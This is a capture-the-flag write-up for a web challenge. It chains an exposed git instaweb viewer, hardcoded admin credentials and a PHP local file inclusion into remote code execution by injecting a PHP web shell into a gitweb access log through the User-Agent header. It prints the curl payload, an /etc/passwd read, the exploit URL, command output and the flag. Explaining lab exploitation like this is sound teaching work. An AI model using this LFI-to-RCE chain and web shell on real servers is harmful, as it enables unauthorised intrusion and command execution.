# RC LIFE (300 points)

RC Life is probably one of the hardest challenges in my track, mostly
because people stopped looking after finding the first vulnerability.

## robots.txt & git repository

The challenge consisted of a simple home page with no dynamic functionality.

The first step of the challenge was to discover the robots.txt file located
at http://localhost:21000/robots.txt.

This reveals two interesting links for us :
 - http://localhost:21000/admin/ (an admin login page)
 - http://localhost:21000/docs/installation.md (instructions to setup the website)

Here's what the instruction page looks like :

```
# RC-LIFE Installation Notes
Here are the installation notes for the deployment of the RC-LIFE website.

## Installation
1. Setup Apache Server (To do)
2. `cd /var/www/`
3. `git clone https://github.com/rc-life/website`
4. `mv website html`

## Browsing repository
If you are unfamiliar with git, use `git instaweb --httpd=webrick -p 21001`.
This will give you access to a web view where you can browse through the
source code/branches/recent changes of the application.
```

Seems like the application comes directly from a git repository... Git repos
include a special `.git` folder which contains the metadata and objects
necessary to reconstruct the source code.

Therefore, publically exposing a `.git` repo also means that we can
reconstruct the source code of the RC-LIFE web app. More on this here : https://en.internetwache.org/dont-publicly-expose-git-or-how-we-downloaded-your-websites-sourcecode-an-analysis-of-alexas-1m-28-07-2015/

Nevertheless, if you didn't know that, the installation notes also suggest
using `git instaweb --httpd=webrick -p 21001` to view the source through a webview.

The `-p 21001` option specifies the port where the webserver will listen on.
We can confirm that the webserver is running by visiting http://localhost:21001/.

## LFI

From the `git instaweb` source code viewer, we can take a look at the
`/admin/index.php` page from earlier to figure out how to login.

Login is pretty straightforward.

```
   1 <?php
   2   error_reporting(0);
   3   session_start();
   4   if (isset($_POST['username']) && isset($_POST['password'])) {
   5     if ($_POST['username'] == 'admin' && $_POST['password'] == 'rclifewootwoot') {
   6       $_SESSION['logged_in'] = true;
   7     } else {
   8       $_SESSION['logged_in'] = false;
   9       $msg = 'Invalid username/password';
  10     }
  11   }
  12
  13   if ($_SESSION['logged_in']) {
  14     if (!isset($_GET['next'])) {
  15       $_GET['next'] = '898111356132e7d5961b6c194be49291.php';
  16     }
  17     include($_GET['next']);
  18     die();
  19   }
```

The username is `admin` and the password is `rclifewootwoot`.
The important part here is that, once logged in, the web application will
include anything from the `$_GET['next']` variable, which is a variable
we control. This is an [LFI vulnerability](https://en.wikipedia.org/wiki/File_inclusion_vulnerability).

We can confirm the issue by visiting http://localhost:21000/admin/?next=/etc/passwd
onced logged in. This link should leak us the /etc/passwd file of the
server.

## RCE!

This was probably the hardest part of the challenge.
A traditional way to leverage an LFI into an RCE is to
inject PHP into log files such as /var/log/apache/access.log.

But since the application is running in a docker container, these log files
aren't available (they are redirected to STDOUT and STDERR).

The key here is `git instaweb` again. Since /var/log/apache/access.log
is used for the server on port `21000`, where are the logs for the server
running on port `21001`?

`git instaweb` is actually a builtin command with `git`. So you can run
a local installation yourself and inspect its inner workings.

```
$ mkdir repo
$ cd repo
$ git init
$ git instaweb --httpd=webrick -p 21001
$ find . -iname *log*
./.git/gitweb/access.log
./.git/gitweb/error.log
```

Seems like an access.log and error.log are available in the `.git` folder.

Finally, we inject PHP in it and include it through the LFI to gain RCE.

```
# This will populate the access.log file with PHP code in the user-agent section
# ... of the log
curl http://127.0.0.1:21001/ --user-agent '<?php system($_GET[c]); ?>'
```

Then we visit
`http://localhost:21000/admin/?next=../.git/gitweb/access.log&c=ls -lah /` :

```


10.133.9.1 - - [08/Nov/2017:16:51:07 UTC] "GET / HTTP/1.1" 200 3084 "-" "total 76K
drwxr-xr-x   1 root root 4.0K Nov  8 15:44 .
drwxr-xr-x   1 root root 4.0K Nov  8 15:44 ..
-rwxr-xr-x   1 root root    0 Nov  8 15:44 .dockerenv
drwxr-xr-x   1 root root 4.0K Oct 21 18:13 bin
drwxr-xr-x   2 root root 4.0K Jul 13 13:01 boot
drwxr-xr-x   5 root root  340 Nov  8 15:44 dev
drwxr-xr-x   1 root root 4.0K Nov  8 15:44 etc
drwxr-xr-x   2 root root 4.0K Jul 13 13:01 home
drwxr-xr-x   1 root root 4.0K Sep 14 23:58 lib
drwxr-xr-x   2 root root 4.0K Sep  7 00:00 lib64
drwxr-xr-x   2 root root 4.0K Sep  7 00:00 media
drwxr-xr-x   2 root root 4.0K Sep  7 00:00 mnt
drwxr-xr-x   2 root root 4.0K Sep  7 00:00 opt
dr-xr-xr-x 128 root root    0 Nov  8 15:44 proc
drwx------   1 root root 4.0K Sep 15 00:42 root
drwxr-xr-x   1 root root 4.0K Nov  8 15:44 run
drwxr-xr-x   2 root root 4.0K Sep  7 00:00 sbin
drwxr-xr-x   2 root root 4.0K Sep  7 00:00 srv
dr-xr-xr-x  13 root root    0 Nov  8 15:44 sys
-rw-r--r--   1 root root   90 Nov  6 22:35 theeee_flaaag_issss_heeeeere.txt
drwxrwxrwt   1 root root 4.0K Nov  8 16:51 tmp
drwxr-xr-x   1 root root 4.0K Sep  7 00:00 usr
drwxr-xr-x   1 root root 4.0K Sep 15 00:08 var
"
```

*RCE!*

```
# cat /theeee_flaaag_issss_heeeeere.txt

// Congratz :) Never heard of "git instaweb" before..
HF-ee704efa99f55aec82cb363dbe3f01ad
```
